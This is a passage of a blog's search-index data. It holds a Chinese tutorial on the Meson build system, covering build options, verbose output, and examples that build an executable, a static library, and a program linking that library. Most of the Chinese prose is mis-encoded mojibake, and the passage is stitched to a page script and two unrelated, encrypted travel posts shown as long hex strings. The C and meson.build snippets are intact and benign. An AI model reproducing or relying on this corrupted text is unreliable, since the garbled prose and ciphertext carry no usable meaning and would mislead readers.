é¡¹ç›®çš„é¡¶å±‚ç›®å½•ç»“æ„å¦‚ä¸‹ 1234meson_projectâ”œâ”€â”€ build # Mesonçš„æ„å»ºç›®å½•â”œâ”€â”€ meson.build # Mesonçš„é…ç½®æ–‡ä»¶â””â”€â”€ meson_project.c # C/C++æºæ–‡ä»¶ Meson æŒ‡å®šç¼–è¯‘å‚æ•°é€šè¿‡ meson configure å‘½ä»¤å¯ä»¥æŸ¥çœ‹ Meson å†…ç½®çš„ç¼–è¯‘å‚æ•°ã€é»˜è®¤å€¼ä»¥åŠå¯é€‰å€¼ 12345# è¿›å…¥Mesoné¡¹ç›®çš„æ ¹ç›®å½•$ cd meson_project# æŸ¥çœ‹Mesonçš„ç¼–è¯‘å‚æ•°$ meson configure Meson é¡¹ç›®å¯ä»¥é€šè¿‡ meson_options.txt é…ç½®æ–‡ä»¶æ¥å¢åŠ é¡¹ç›®ç‰¹æœ‰çš„ç¼–è¯‘å‚æ•°ï¼Œå¦‚ï¼š 1234option('tests', type: 'boolean', value: true, description: 'build unit tests')option('use_hpet', type: 'boolean', value: false, description: 'use HPET timer in EAL') Meson è¿˜æ”¯æŒåœ¨ç”Ÿæˆé¡¹ç›®ç¼–è¯‘é…ç½®æ—¶ï¼Œé€šè¿‡ -D æŒ‡å®šç¼–è¯‘å‚æ•° 1234567891011# è¿›å…¥Mesoné¡¹ç›®çš„æ ¹ç›®å½•$ cd meson_project# æŒ‡å®šç¼–è¯‘å‚æ•°ï¼Œç”Ÿæˆè¾“å‡ºç›®å½•$ meson build -Dprefix=/usr -Dtests=disabled# è¿›å…¥è¾“å‡ºç›®å½•$ cd build# ç¼–è¯‘ä»£ç $ ninja -j8 Meson æ‰“å°ç¼–è¯‘ä¿¡æ¯é€šè¿‡ --verbose å‚æ•°ï¼ŒMesson å’Œ Ninja å¯ä»¥æ‰“å°è¯¦ç»†çš„ç¼–è¯‘ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç¼–è¯‘é¡¹ç›®æ—¶ï¼Œæ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤ 12345678910# è¿›å…¥è¾“å‡ºç›®å½•$ cd build# ç¼–è¯‘ä»£ç $ meson compile --verbose# æˆ–è€…# ç¼–è¯‘ä»£ç $ ninja --verbose Meson å®æˆ˜åº”ç”¨æ¡ˆä¾‹æ„å»ºå¯æ‰§è¡Œé¡¹ç›®warningè‹¥ä½¿ç”¨çš„æ˜¯ Windows å¹³å°ï¼Œåˆ™éœ€è¦åœ¨ Visual Studio å¼€å‘äººå‘˜å·¥å…·ï¼ˆNative Tools Command Prompt for VS xxxxï¼‰é‡Œæ‰§è¡Œ Meson çš„å‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸º C/C++ ç¼–è¯‘å™¨åªä¼šåœ¨è¯¥å·¥å…·ä¸Šè¿è¡Œã€‚ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé¡¹ç›®ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  123meson_demoâ”œâ”€â”€ main.câ””â”€â”€ meson.build main.c çš„æ–‡ä»¶å†…å®¹ 123456#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { printf(\"Hello World!\\n\"); return 0;} meson.build çš„æ–‡ä»¶å†…å®¹ 12project('meson_demo', 'c')exe = executable('main', 'main.c') ç¬¬äºŒæ­¥ï¼šæ„å»ºé¡¹ç›® 1234567891011121314# è¿›å…¥é¡¹ç›®ç›®å½•$ meson_demo# ç”Ÿæˆæ„å»ºç›®å½•ï¼Œbuildæ˜¯æ„å»ºç›®å½•çš„åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰$ meson build # æˆ–è€… meson setup build# è¿›å…¥æ„å»ºç›®å½•$ cd build# ç¼–è¯‘é¡¹ç›®ä»£ç $ ninja# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶$ ./main Meson é…ç½®æ–‡ä»¶ï¼ˆmeson.buildï¼‰çš„è¯´æ˜å¦‚ä¸‹ï¼š project('meson_demo', 'c')ï¼šæŒ‡å®šé¡¹ç›®åç§°å’Œç¼–ç¨‹è¯­è¨€çš„ç±»å‹ exe = executable('main', 'main.c')ï¼šæŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶åå’Œå…¥å£æºæ–‡ä»¶ æ„å»ºé™æ€åº“é¡¹ç›®warningè‹¥ä½¿ç”¨çš„æ˜¯ Windows å¹³å°ï¼Œåˆ™éœ€è¦åœ¨ Visual Studio å¼€å‘äººå‘˜å·¥å…·ï¼ˆNative Tools Command Prompt for VS xxxxï¼‰é‡Œæ‰§è¡Œ Meson çš„å‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸º C/C++ ç¼–è¯‘å™¨åªä¼šåœ¨è¯¥å·¥å…·ä¸Šè¿è¡Œã€‚ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé™æ€åº“çš„é¡¹ç›®ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  12345static_lib_projectâ”œâ”€â”€ meson.buildâ””â”€â”€ src â”œâ”€â”€ static_lib.c â””â”€â”€ static_lib.h static_lib.h çš„æ–‡ä»¶å†…å®¹ 123456#ifndef _THIRD_LIB_#define _THIRD_LIB_ void info_print(); #endif static_lib.c çš„æ–‡ä»¶å†…å®¹ 1234567#include &lt;stdio.h&gt;#include \"static_lib.h\"void info_print(){ printf(\"hello static library\\n\");} meson.build çš„æ–‡ä»¶å†…å®¹ 12project('static_lib_project', 'c')static_library('static_lib', 'src/static_lib.c') ç¬¬äºŒæ­¥ï¼šæ„å»ºé¡¹ç›® 12345678910111213141516171819202122232425# è¿›å…¥é¡¹ç›®ç›®å½•$ cd static_lib_project# ç”Ÿæˆæ„å»ºç›®å½•ï¼Œbuildæ˜¯æ„å»ºç›®å½•çš„åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰$ meson build # æˆ–è€… meson setup build# è¿›å…¥æ„å»ºç›®å½•$ cd build# ç¼–è¯‘é¡¹ç›®ä»£ç $ ninja# é¡¹ç›®æˆåŠŸç¼–è¯‘åï¼Œä¼šç”Ÿæˆé™æ€åº“æ–‡ä»¶\"libstatic_lib.aâ€œ $ ls -aldrwxr-xr-x. 6 clay clay 4096 08æœˆ 12 21:05 .drwxr-xr-x. 4 clay clay 46 08æœˆ 12 10:13 ..-rw-r--r--. 1 clay clay 2972 08æœˆ 12 10:13 build.ninja-rw-r--r--. 1 clay clay 430 08æœˆ 12 10:13 compile_commands.json-rw-r--r--. 1 clay clay 3564 08æœˆ 12 21:05 libstatic_lib.adrwxr-xr-x. 2 clay clay 31 08æœˆ 12 21:05 libstatic_lib.a.pdrwxr-xr-x. 2 clay clay 4096 08æœˆ 12 10:13 meson-infodrwxr-xr-x. 2 clay clay 26 08æœˆ 12 10:13 meson-logsdrwxr-xr-x. 2 clay clay 4096 08æœˆ 12 10:13 meson-private-rw-r--r--. 1 clay clay 808 08æœˆ 12 21:05 .ninja_deps-rw-r--r--. 1 clay clay 152 08æœˆ 12 21:05 .ninja_log Meson é…ç½®æ–‡ä»¶ï¼ˆmeson.buildï¼‰çš„è¯´æ˜å¦‚ä¸‹ï¼š project('static_lib_project', 'c')ï¼šæŒ‡å®šé¡¹ç›®åç§°å’Œç¼–ç¨‹è¯­è¨€çš„ç±»å‹ static_library('static_lib', 'src/static_lib.c')ï¼šæŒ‡å®šé™æ€åº“æ–‡ä»¶çš„æ–‡ä»¶åå’Œå…¥å£æºæ–‡ä»¶ æ„å»ºåŠ è½½ç¬¬ä¸‰æ–¹é™æ€åº“çš„å¯æ‰§è¡Œé¡¹ç›®warningè‹¥ä½¿ç”¨çš„æ˜¯ Windows å¹³å°ï¼Œåˆ™éœ€è¦åœ¨ Visual Studio å¼€å‘äººå‘˜å·¥å…·ï¼ˆNative Tools Command Prompt for VS xxxxï¼‰é‡Œæ‰§è¡Œ Meson çš„å‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸º C/C++ ç¼–è¯‘å™¨åªä¼šåœ¨è¯¥å·¥å…·ä¸Šè¿è¡Œã€‚ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºé™æ€åº“çš„é¡¹ç›®ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  12345678load_static_lib_projectâ”œâ”€â”€ meson.buildâ””â”€â”€ src â”œâ”€â”€ include â”‚&nbsp;&nbsp; â””â”€â”€ static_lib.h â”œâ”€â”€ lib â”‚&nbsp;&nbsp; â””â”€â”€ libstatic_lib.a â””â”€â”€ main.c static_lib.h çš„æ–‡ä»¶å†…å®¹ 123456#ifndef _THIRD_LIB_#define _THIRD_LIB_ void info_print(); #endif main.c çš„æ–‡ä»¶å†…å®¹ 1234567#include &lt;stdio.h&gt;#include \"static_lib.h\" int main(int argc, char *argv[]) { info_print(); return 0;} meson.build çš„æ–‡ä»¶å†…å®¹ 123project('load_static_lib_project', 'c')libs=meson.get_compiler('c').find_library('static_lib', dirs : join_paths(meson.source_root(),'src/lib'))executable('load_static_lib', 'src/main.c', dependencies : libs, include_directories : 'src/include') ç¬¬äºŒæ­¥ï¼šæ„å»ºé¡¹ç›® 1234567891011121314# è¿›å…¥é¡¹ç›®ç›®å½•$ cd load_static_lib_project# ç”Ÿæˆæ„å»ºç›®å½•ï¼Œbuildæ˜¯æ„å»ºç›®å½•çš„åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰$ meson build # æˆ–è€… meson setup build# è¿›å…¥æ„å»ºç›®å½•$ cd build# ç¼–è¯‘é¡¹ç›®ä»£ç $ ninja# è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶$ ./load_static_lib Meson é…ç½®æ–‡ä»¶ï¼ˆmeson.buildï¼‰çš„è¯´æ˜å¦‚ä¸‹ï¼š ç¬¬ä¸€è¡Œï¼šæŒ‡å®šé¡¹ç›®åç§°å’Œç¼–ç¨‹è¯­è¨€çš„ç±»å‹ ç¬¬äºŒè¡Œï¼šæŒ‡å®šé™æ€åº“æ–‡ä»¶çš„åç§°å’Œæ‰€åœ¨ç›®å½•çš„è·¯å¾„ï¼Œæ–‡ä»¶åç§°ä¸éœ€è¦åŠ â€libâ€ å‰ç¼€ ç¬¬ä¸‰è¡Œï¼šæŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶åã€å…¥å£æºæ–‡ä»¶ã€é™æ€åº“çš„å¤´æ–‡ä»¶æ‰€åœ¨ç›®å½•çš„è·¯å¾„ å‚è€ƒåšå®¢ Meson çš„ä½¿ç”¨ Meson æ„å»ºç³»ç»Ÿ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"id\": \"readmore-container\", \"blogId\": \"96641-5333172926158-056\", \"name\": \"å…¨æ ˆæŠ€æœ¯é©¿ç«™\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"lockToc\": \"yes\", \"type\": \"hexo\", \"random\": \"0.9\", \"interval\": \"30\", \"expires\": \"365\", \"height\": \"auto\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"c++ linuxç³»ç»Ÿç¼–ç¨‹ cè¯­è¨€"},{title:"å¤©æ²³åŒºç æ±Ÿæ–°åŸæ¸¸ç©æ”»ç•¥",url:"/posts/8f9b760f.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff47706ffc743104777c4965ff8a7b19bcd7fb5854f8c8385c178e22fc4b4917634f8174113ab3c248b5567670498e4b3582d370fa25b353dd4483e262b452985c89fed55e0d8b5148d3977984a50f45365af23e0715385c5961089177d1a31f696e1de0307518a492e2d8e785c7c786b32630813cad2535cb3732124351985375ddb611447f77058afe5ec950a2baf6994aaeae40b035c4d1cf26a0064aa989c5cb620194df67aaa661292a8be210a86c515477351fb182e58a285cbbb958595c1a7a832d15fe62b9fe72a553500f7619111dd795a6f5af319463c8839b03ac1190e1bdd487a1c653b16492652442486f9b851d346f68703755028d781c24109df6425d6f7daea0465ce2bc58e0c41fea420a2425644192ea4a9e26d0a07830e393c2b05e3e0fbf67419e2a18868760f0b19d9bddf69e619b83fa3b50b8b0339cf021e36924e00030507b20895d4c475580f4920d1568951a640f5be006b42366953af86c4226e11adb956d5f555d82667aea58554e3f40e0196c51c6ece62332bcf93f5bd269cadcd7914dcb1179ff6a539307f687d8b70d930d9ebbb01e66f6e587dd8119926f0f7eb5da11f12a817d703e931da6744ced4655d806268ece11b6ec943ff8601572e8ab030d2a6c545b36c665a11c97f1a6135638e21c6626f0048a6292c7e92ca945bf2287c0e4294e0cd952d6c003a8159cafbcd7df3599c51628108637a26679b5c9db92455f15fdc6a6fc2f54370cf48935fcca4fbec030d7f5f1b94fa24b01052bdbe4976e9672fccc4d0ce31c0bd55569564735ad93f85ba50f86f4c419a1b67877295d3aaa44d307fa94bd7be2aee7109a08a26528cce8cbdcaa431fef646d9d35a359ce29d32e05dca10c8ca8e4e93fe278ea2c3637c021c1125b8b5a368748291d72981aff77b7db8815b7bcb819430a72c24734c0284f00a6b03238d9da139d34ca30634df032dbc9d21f924e04f82d3f1dcbe8158ce4244e02bfba84eee8e971e9293171ce86a7c20d80b818effdabb7c039d4a13a757294ae2a2ffec61d14c5f18862ad85f26c606a51f74ed494bd55c4b7d256db30e9892838188d78b88577ed4ab981de8f836516bfc00aac99f086246881bf818f7cf7c9add920f754da5d40af6b49ac2cc2ed101ffc9b847934f90b42e15cc0b399520399fd409cfff857d32214232eef8dbff93202768878bf596000be8ad2715d5d1195d8615c49986847bf3c19a0671ff19fc150a1d7deaeb7665c3b97804278f20dbbe0f39977339591934bf9a434c6bf85c298b5b2f2c94cbe2914bc03f2bfc20d04f997fd8251395a5228b56a149c1f7dfddf4c87c530d9077a6a1471e584fa23746bf58fec7f72c8b954a8e410ee0a347fce07d325c765456e942333739342e8ac964c4fff21b1680a4cf1a9de5ef52a8259cb8371d64e9ec4489e78c8c6453005aaffb8252dc760e5a177aaab9b065227e8b33701e79319b0654acde68406608d878c66ae0db6ad515871185b0658f7329b31eba2724206183a3a8672b5bfcc89cfe9fd7e4b93a51a330109d6c7813ba07903c57ca219b008188809a43a4ec5b5f5e12ac5dc16f8a86f6081bc22ebe65c56a1d135397e80181a0a6e215da638661ffb09e7039a3d5c8040e5d59bf21fe76ce4f6e52bc068925a21ff58b8b33f08b689ed326be693feca8be86b610144e140363d2168adc44b0b8bbd323eab01f6c8d06f104706a964641a0c2787f16935fbf2ad46c2662c6be036385c631609974919d11ce9e0eab4e00fcfba7a1827426612397ab33ca98bf3a0dbe301d3bac5716836eacdc53280de5468ac632ed96f68a013155da75a2da97ee79aff970da431780d1fcc148fca22ec32bdf51533426be07d57e74db37825eea457aa4f5f7d7d3a7645f816c8974d189ebc728eb22735c727d42847cba1ec240ecf26807eaa94dceb0bc40aa46c3a6deab799e082538794c791a19b54689cb42c97c4fb4e914ecaac520483de6b11ee53552f944de35973dc41dd25b4baea8a6a379d478c49f9ee0b7d0c8aacd392a5f15564477223dad5329cae43bcbd662d0859b52ffdfa0a67e5bb8e3a0a5eaa3fb52477938b0bdb07d906bbdc18b012109b20f30466ec0e21e10bf831777f6ff14b52f2acb56d224c6f1db3bf86df826a98bc8e2339de5dd4a7a9ba04f6fb51d47e8027e90c61dbafe61576388acece2f9aad826b6382acc6b829240e46cb79c52f5f05656eed1792650e12fd10d6fa8f27f555d13478578dd2569eb64c47dc1c657dfaf89db9de0ff4ccec8b4394aefbeddc1ca8dcb56ff90dd99b77d1bbf9548f53128d11af0fbfe25dc5abef29dc774708e1fc4bbb85c9b818791a2e3a0d3d68cef4426add40c8552ca573a7cd1dd2709d37e3b025b6ce7c84d7c60f3632fb28994462797a5e719b40300c0190012d7ec687d8ad305f0cc6a1b0d122bf04a079db12a70d146c6443c1559c2244133cfa2996bc13e0e74b124c105b6d2373fdc181644b7a456852d23eec36f4f5f42aa8ba06e232ba9613bcf5c9dc12bc3c0ae6493a7d2032d7a9fe6f58757be1f76918532389faf358b92ee2158e182ab7419cdc7375bce78ef8a8f61541eb179475f511d2024da0dd35c68b187bac359eb8eccca58a998598b977498e2ecb561bfa934e79d051b483b06fa34ef6e5829ac894928c1f87435a05ffc16558fdb8dbf461268aa0bad3fb40586f804853c99baddbf898e5a51aac74bbf1c9afc88c35065e1ff57c7d9a0375e656cff792e37d35b6b176472c3897da7656e7c71a51eff2ba52d2eaf0eccc27b22e98c1e067e40a9f8e0cb937a9041a05143656023f362bd1a954ecaf437e6d9da3b64ab9b5c7d3f501fc00556509de4614eb237d66ec88ecd9584bb9b6e63ed2a349e683e8470d87c1c5daddf79645d46bb43cadadafd6d176b54858395032d5d91080f1eca22642d7a7cc7ef1bbe60d29e10b03d7c5439dbbc50d91e1b96edf12149dad92344d474d970d19e855a218962fb6b7e8ea086e2ac9f94609f5d05b1c004c10fe2da278f73164b591aedaac07b9065190e37d9ad7787d912135c5346e7aadf7008683afd2838ce4140683edd22b005be3483b792d51eae1f803b2fd566c41b5f1ddb62454b99765d3f04fa46e95dc70f790e652a47c18c98a8b66585f22fb4def4f9265ee22fa773c47863d8fc2cb2f131141729c12b3be9faece79c93c85c26e6942220c260a6d833f4dda35a183961f768b326cc5602d5890c99abbed0a626cb935e3b5d37b08add53568bf7ea38e91217a0a5d35ef7e6b5945eb5270f81eb25f848892ad6c850ed91637bd94eb29c09881b7d4cd4f5e370ebd68502d11f55bc0024ab56681022a58b5c6d7dacfcf399cda84d73deb36da250428dbea8d17362de3749f4b703ad2080330847d64f5654500fb52a59a225548365330018d3d2abdfd2b68f8824d7964724b5d491f4980974953b09a0c247ef415aba43a5b9e4f9e9531f2457911719c66cea90284dafdf2ce93b7a0ea51d84dcd83098a3574c298bdc52a3c8cb00a1b5a58e5ec76716553f2d803c0cefaa2fe71bd0a06ee84618b68cc74dfe0ca3c5753f6bb7cb5adee2435dd81796bbfb729528bdb57497a728292ba9f1b6c088a4bf4953074ae80e6caf81d675e9d5f81da2a58c0f0e13a4ea135881e120946c88c04f2111e08e0aa5011390e4aec87430dee1b4bbbae9a988390b01042e14cba9e5d352aaa626b2f5e45f1e3442a7308d2c238938f21490fa50042321894dbad64f917855b9f896da862e1e4c2bd8477f8635069d1a60f63df428875c278475e7561f41c1ea95cef544545ef4262ce4964b7a5b167e8bf7d95797072a2e031a6e43a59678a75ab0398efc6b1418760d24489e93bb303b6382140e80138ac0450dcc6466e60f94853f340fabddd327a0ee8bb1f5aced69e903211bb25a695bae9ae933d948ad354edc83208e9e2dac04f387841fdc61f06da27ed833bd559cbdaee6cdca296faf2e1a3ee0a27022cbb070ed7b81f4d684d4599f2a02030c642008ac4d50e1e63e490ce509c47090dbdb037ec553f59670c0211b13179695e986f6f8b150d3e635e66ef7f8098210fb87660bb8692c958eee57a089a1b5040abb7508c365be76cb4fdc6cb6eca9ae71d83ad83446f5afe7e3f451c177b5fd8eef4fb81608d68e223fbc8844e979355e2b71047afc5b99d8b71021698257437f70d05c26559085d370a571ff0801ce89bdf520e6a4e56be08a0b30a88b581ff396adc9b9abbb096886f22800215e4d97644ee8b4331b3121457216537f18b2b91d1a5222929cc0e67a16e1ac1c9a923c0055864fd6888e7fd76435a37295f664d60295fea59ac3932e3d6fbd63ff1ad09d51070a5bd42ee8780ff816079648e844d4d67b5ec988478cb54fcb9a9a68da2f398e37ad2032adefe75cc520787c904206fff76c7a7c858f3d983aefc268916d64c8b9f3fee1f64a950ae06aae21fa57589f61d6364e1fc1a393e630f51d1a80a66ec0af9b0affa9e0ed140d0e5433b325dc12a39822c567036109040c4498e3f4b7b2c5c3fd95ae80a5b28de0be6daf04abf3f098c12f5e414d8da2a5a1d58af7dce32e2d841b4381080eb00eefe8a74069a2a344604114a1c8589366bb7c5b79622e34c9d77eb7137cfbcbb17b9a22f2b634674c548956828acf2983f2623589fad1d9a88522bc734c6337d977e7318afdc1a71ea7692d1c8dd6c1ad4bc032580377cca3a51de105135bec0b07f395583121f79bf7f2d2d68a4a50e4511a8c070ed1edd77694708dca75b101e993112b8e492f57a7a27fc1951b50021087e9f8dc796ee925803e9603939a5c29c6efea292ecccdb4c5f18a50a21566a3f682eafa2d838f388785a24d821d266972589723da8e06a5c9423f35654ca6308d66d5b95a9e88887aeb1a4dca8998b1a9bc1d76c203104948382340866a1289acc2470703490529bb8dcf22ffb00396fd55569f60c9253fd3d8702028fef772a94641e6e331986686a55a1ba9ceefaa6218cf0f0e23600c490e8ad34c8fa1d947288ab3b9d09465c247939c8762a14f28d57218191ba6bdc361cdd79a48f370c43a658abefbe00ac42768f4099af8daf7241f8fab3090a4c9c7e79fc9480875c56d0c9106b3bdeeaaa695a3ce044807b86743f43aea63af1ea84a9a6399d8be6f2ea4fb58cc7baed81fb7116b6c92fe3fc7c8cdef1885375bac26ebe78de07becc721e35273a74d41c4126e6921a6d7bacbdcc165261bb9abc9db8237a8e3201502e39cb54a9f9e45fe988c55f4ee689ff0cc109f01e4424534dea347a370c7f04d90d8b78ee61a062229d3e8bceb6d333aacf4fa3809369199aec61a0fb6e04f5471362dc7473507ab503ac9695e9b80f6e93034b3be1391db5fedfc457b219c37c6a3f6e0115b2edf2d8c74f260afb1a6cda82048628d2a59b4974e7f015a64174da8f6be83cfec0c8232a95de94049f7e469ea6c04bf6d13847f3219c1a28967b77cd30449b4341966ddee50fa03aa006057b872d23b6ccb7f7ada516502bcd781dcf24abe17c6116841116a4b1810cd5b87c6ef4eac0189fb1fccacd9fbed96d2d7aa03070fc1add15908452545c739dbc6c6586a06938922ed9f4e97b854714d01be5afdbf1e21af06a9c434da55998a5763a6a5f234d7697afd6dc5a5fa93b2c474b2f64d5dbd40a8a925fd2e3e0bf42a02b1cedfe222de207e3ea1ee09cd7390bc5947021131e341eac426237b5a18a8a75d8b5f631068bcf20a75ff691dfe5bef4ef9d5233a86792601280f276d83543fc802f2af9e4dff51a5e248c7329278c3c0bf4a1fd333582ccf5734ba096514ebddd15b7a5161bf7c056497249b82a82ef1dfbc75716944130b4e6d15783ea223c3b82063e7f716a2764f7fa117ccf53d467640874f093658e98864f0a35f949c97a3b3d453eeb2304254d0acd47eb306147fad63750f8ce13fdf4a7a03208feef0a85760c89c90310e1712c6077c34f9e23f7c76a8959b650a02e056011cfb552a7c1ed0ce6b255045f24491f7914290f55814c9afc50828b00641f25b482f10bc58bf1182f38b47540c7a95f9792bcc53a07b8a4698e0bfef01a5a7664ca0f6a41c3eca90177ac390acd2dafb63afa67b423d8705ac69e3462340abb314de506904975f70971b14605762dff5fbecf03cebb6b0c462854c46beedd81bda9650879d5b5aeedef1f5aaf08eef7c24505ee9094292fcb6b66aacb55b7ea2309217e8e5630f82f41387367d4307a869732884742fb37a55c03273e5b1652c201dd5a7523234ae59b2a9bbd029e43345b5bdd1c2611fb8a57e913c07340997916ad9150837184a1f29c825127f47b3eab50a775ab2f645b101bc890cfe00f86552b45c2a7b813940db70fa5208089028229f9c38a60f1049964dbc8b016323905195d3886dccee2c6e060bdd4e4dece23305827478318b12d7640ecc793dbddb6cb850178b57f3c4a0506f2fc58bfc3efbdaffb94231618393770ed04c033171dcb1bce7971860b6910be02b100dc2cfc6927b697b76966b0f6c32083d6d83deee9629026199458bddbcb749df2bd36d635f26a87ee909864a0a2b0c955a32b116c5dea02ba843294108fd3d34be526202a6e2cf760f9328965c37874a1f516be9918ce5de2c124cb5cd4ce4436c1978d60cd94da64603ef095d738c27b7ba09954eec629fb09de5a6709165a5152ae3dc94b44e4f09725bee20aaa8eb974a4914184419e3f85ea3ce90db81ffa82c69fd512a21d6d7bfdc913641261be065edd62e82c5b93485ae23dd07a275b592b7016066c0cda7b59fdc4e83eaed50bc0b7c296c8c6a939992b6711432e8ca921a8c22768de321243950126952c9dc2d556423378db6166495e9e8ee442c194b790c8b9b90bb02c6c2535177146bf5be5bfb4fc2cb13c78f8ab2f500cfd1846dac76073f902c9b730a84cec738bacb0743dd84dd70801c906163af2efb6304f9ea78b890d4a8a1719bb8f057a7a464c8d59ed5c02602f381abfc64da63a139c5c8bc17ae43e9792c82669ac8aa39fda2d74ec150441f167c70fa4d99d0510be83ebee29c4fc876d0fa9cbb1b4d4aa3a7682c44d68b45bb695723d8b792c5d394f2416b00276ad440b8b96649deb7a7c9011ccb4b2521ec3130e1e5b45fb84d9dcd73c93359eef5ef4bb69273ea128e957f73fc1181a5fcd9929c6dfb77e0e61cddd4f5869b3ef47f649020318ae8865780f9e59a07c8040e5ab6f5596ad714931bfb4fa48646c9604e240488357d0f03a487d9eefb6691ec8bb2a è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢ æ¸¸ç©æ”»ç•¥"},{title:"å¤©æ²³åŒºä½“è‚²è¥¿è·¯æ¸¸ç©æ”»ç•¥",url:"/posts/4d9c17ad.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff47706ffc743104777c4965ff8a7b19bcd7fb5854f8c8385c178e22fc4b4917634f8174113ab3c248b5567670498e4b35dcdcc21dbb61f57159cb1bc4dd26416cd644875b2d8530658c6011678117f55afd5b5dcb235a792ee60580e585d3080dee58ca9f7c899c3832d5f76e7c97e6539433af8cf9b369ca498a667902a274f60ac736f761ad127df263db89c57f33fda79aa924bd20ea9083a5a8cc32eb98624a0c9f27d19a58dbb06d07af3828f81756e794c3c60fed78d3eb40fa1abd64e063096d4acfbe37333c0c978997b4f005d8a51f3d29856ec3484b97b96735479de280acf99b5fbf34cbc56318efc636d9608a40b007dc726f51dccd7fa643646726dd0c967f6e5f17238b3c71dc7e7b318fe24ff57649a5fbc4442d87d2d7f5038737ec876b7559105e2ae06420647dd26c97ca55ebc2c74132b3a3476f035e34f27e9fe739fc6eadc6d254588beb90d9a03bea22335b4913ef04d109f67b12798aa3758db21edd02cdc6e48fa276a0d6a5f681fd397e2d0cb0c5004f604f0e311873c8781bdc16aa831a429521abde4fdf251a4bd08a0d945d59118165272a074413bdc39e0c3136463e35f0b6b80572565a32aa83927516ff06c4962ad31eebe87299ea33420e20efd6d36a2a7d31b9d872594025801dcbf9acd8431582e0741f7c74501752dda8ad110794575bb4910c7717a8d5635062db26dcb91cfd9ffc3cb81ad4206cf044045513b59a7278f5f3afa389674fcc80c1a224a90b0cef1c3174799588719470ea1e7974dbe03aad70967a9cd3d6e841bfed03be69a079bf9c3d51ea878ecd829634e90a563bdc4761544443829470ad9f8b717705f21e92a87c3453cd41a202e149e2b54bc6f00d2f3e42d0034bf75f9e18ec5663c93c9e0362a412c08b560d36452f3e6e5df8a6a6862ffbe82dbd67f11740dba954491d80acfe05e13819e50fc3dfdd5633cc6535cea45b1d2134d62a3891281614bed0caae2d923afef07da8e6d2152009feb7fa6e8aa46f233e0662af08154f816f6b14e4229bfa9bb645c97f6c8a2adebcd4d0036749e2a4f6d5c456b40f521cd334fe5c80409777364580ba41b46a69a76feca143dfc6a5c28920b9cfc90bf52c6431ea9fed0c4db648cdb898851d7833579c420a29764994b69ed59ba48ea276e7c4f6774214ee1ab0da840fa2a71cde9d7f84790a5c2357f46a854a7aee27bf10e8d0da3c734a6470fdb213325ebc7c30762d6aed4ec9cc68c276e68d403983b5e4400b56dba617f53ad275744509e67026d19183824da0bebb5b013e1f6973742d212a9b4a63d2ac181dbea894ff27dfe365d458a31265580f6b8488408596413020dc0b086b23eeeed9268d1efcdb117c182844bfcdee8b083bac025e84408ef4b213afe31acd83f3d10d98d8502ac5221032ebec7289eaf3ada191970d34ef4402725a681da02da61eb4ff03a4e9066c0e1397dba683cd7b86c00637c424b225d51e13533cea074f32943fdea71cfd09c100f499b0e45f9080f839fe0f70000baf93f8d61a28a1f774ed1f78ea4fdb85db256aab95d4bcd1b96be1d400da731ad92c976eb62de7295f2982ac39965467f85bd8fe765b701a9c918eb4006a6757e802a06b4101ebaff880fee5121d3340b456f7463a8ae9bbf22b4b83bcd1075dfa